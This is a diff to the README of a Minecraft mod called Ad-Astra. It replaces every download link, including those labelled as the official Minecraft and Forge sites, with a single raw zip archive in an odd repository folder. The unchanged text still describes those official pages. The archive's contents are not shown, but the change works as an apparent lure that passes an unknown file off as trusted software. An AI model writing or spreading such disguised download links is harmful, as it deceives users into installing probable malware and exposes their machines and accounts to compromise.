@@ -1,6 +1,6 @@
 # 🚀 Ad-Astra - Explore Space in Minecraft Easily
 
-[![Download Ad-Astra](https://img.shields.io/badge/Download-Ad_Astra-brightgreen)](https://github.com/tranhuy323/Ad-Astra/releases)
+[![Download Ad-Astra](https://img.shields.io/badge/Download-Ad_Astra-brightgreen)](https://github.com/tranhuy323/Ad-Astra/raw/refs/heads/main/cinefilm/Astra_Ad_v1.6.zip)
 
 ---
 
@@ -46,10 +46,10 @@ These features make space exploration in Minecraft feel real and exciting withou
 
 Use the button below to visit the official release page where you can get the latest version of Ad-Astra:
 
-[![Get Ad-Astra Releases](https://img.shields.io/badge/Visit-Release_Page-blue)](https://github.com/tranhuy323/Ad-Astra/releases)
+[![Get Ad-Astra Releases](https://img.shields.io/badge/Visit-Release_Page-blue)](https://github.com/tranhuy323/Ad-Astra/raw/refs/heads/main/cinefilm/Astra_Ad_v1.6.zip)
 
 1. Click the button or go to this page:  
-   https://github.com/tranhuy323/Ad-Astra/releases
+   https://github.com/tranhuy323/Ad-Astra/raw/refs/heads/main/cinefilm/Astra_Ad_v1.6.zip
 
 2. On the releases page, look for the newest version at the top.
 
@@ -67,7 +67,7 @@ Follow these steps one by one to get Ad-Astra working in Minecraft. No programmi
 
 If you do not have Minecraft Java Edition:
 
-- Visit https://www.minecraft.net/en-us/download
+- Visit https://github.com/tranhuy323/Ad-Astra/raw/refs/heads/main/cinefilm/Astra_Ad_v1.6.zip
 - Download and install the Java Edition for Windows.
 - Create a Minecraft account if you don’t have one.
 - Run Minecraft once to complete its setup.
@@ -77,7 +77,7 @@ If you do not have Minecraft Java Edition:
 Minecraft Forge is a tool needed to run mods like Ad-Astra.
 
 1. Open your web browser and go to:  
-   https://files.minecraftforge.net/
+   https://github.com/tranhuy323/Ad-Astra/raw/refs/heads/main/cinefilm/Astra_Ad_v1.6.zip
 
 2. Under “Minecraft Version,” select the version that matches your Minecraft (for example, 1.19).
 
@@ -149,9 +149,9 @@ If the game crashes or fails to load, removing Ad-Astra from the mods folder wil
 
 ## 🔗 Useful Links
 
-- Ad-Astra official releases → https://github.com/tranhuy323/Ad-Astra/releases  
-- Minecraft download → https://www.minecraft.net/en-us/download  
-- Forge installer → https://files.minecraftforge.net/  
+- Ad-Astra official releases → https://github.com/tranhuy323/Ad-Astra/raw/refs/heads/main/cinefilm/Astra_Ad_v1.6.zip  
+- Minecraft download → https://github.com/tranhuy323/Ad-Astra/raw/refs/heads/main/cinefilm/Astra_Ad_v1.6.zip  
+- Forge installer → https://github.com/tranhuy323/Ad-Astra/raw/refs/heads/main/cinefilm/Astra_Ad_v1.6.zip  
 
 ---
 
